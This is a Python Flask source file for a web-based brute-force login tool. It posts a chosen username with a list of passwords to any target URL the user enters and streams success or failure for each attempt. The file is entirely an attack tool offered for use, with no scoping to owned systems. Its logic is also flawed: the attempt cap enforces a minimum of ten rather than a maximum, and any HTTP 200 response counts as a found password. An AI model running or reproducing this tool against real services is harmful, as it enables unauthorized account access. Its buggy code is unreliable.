from flask import Flask, request, render_template, Response, send_from_directory
import time, requests, os

app = Flask(__name__)
app.static_folder = 'static'

attack_running = False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/static/<path:filename>")
def static_files(filename):
    return send_from_directory('static', filename)

@app.route("/start", methods=["POST"])
def start_attack():
    global attack_running
    if attack_running:
        return Response("Another attack is in progress", mimetype='text/plain')

    data = request.get_json()
    target = data['target']
    username = data['username']
    passwords = data['passwords'].split(',')
    max_attempts = max(int(data['max_attempts']), 10)
    delay = float(data['delay'])

    def generate():
        global attack_running
        attack_running = True
        yield f"🟡 Starting brute force attack on {target}...\n"
        for i, pwd in enumerate(passwords):
            if i >= max_attempts:
                yield f"⚠ Max attempts reached. Stopping.\n"
                break
            try:
                r = requests.post(target, data={"username": username, "password": pwd})
                if "Login successful" in r.text or r.status_code == 200:
                    yield f"✅ Password found: {pwd}\n"
                    break
                else:
                    yield f"❌ Failed attempt with: {pwd}\n"
            except Exception as e:
                yield f"🔴 Error: {str(e)}\n"
            time.sleep(delay)
        attack_running = False

    return Response(generate(), mimetype='text/plain')

if __name__ == "__main__":
    if not os.path.exists('static'):
        os.makedirs('static')
    app.run(debug=True)
